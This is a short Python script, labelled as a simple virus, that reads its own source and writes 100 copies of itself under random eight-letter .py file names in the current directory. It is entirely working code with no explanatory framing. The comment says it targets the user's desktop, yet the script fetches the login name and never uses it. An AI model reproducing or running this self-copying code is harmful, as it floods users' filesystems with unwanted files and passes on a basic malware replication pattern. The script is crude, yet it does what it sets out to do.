# Simple virus that self replicates in user's desktop
# Modules / Components needed
from os import getlogin
from string import ascii_lowercase
from random import choice

# Variables
with open(__file__, 'r') as File_Obj:
	Code = File_Obj.read()

User = getlogin()

# Functions
def Replicate(File_Name):
	with open(File_Name, 'w') as File_Obj:
		File_Obj.write(Code)

Random_String = lambda length:"".join([choice(ascii_lowercase) for x in range(length)]) + ".py"

# Main
for _ in range(100):
	Replicate(Random_String(8))
